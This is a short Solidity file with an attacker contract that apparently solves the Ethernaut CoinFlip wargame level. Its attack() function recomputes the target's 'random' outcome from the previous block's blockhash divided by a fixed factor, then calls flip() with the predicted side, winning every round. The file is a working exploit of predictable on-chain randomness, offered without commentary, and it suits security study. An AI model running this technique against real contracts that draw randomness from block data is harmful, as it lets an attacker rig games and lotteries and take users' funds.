// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface ICoinFlip {
  function flip(bool _guess) external returns(bool);
  function consecutiveWins() external view returns(uint256);
}

contract GuessCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip flipContract;

    constructor(address c) {
        flipContract = ICoinFlip(c);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - (1)));

        uint256 coinFlip = blockValue/(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        flipContract.flip(side);
    }
}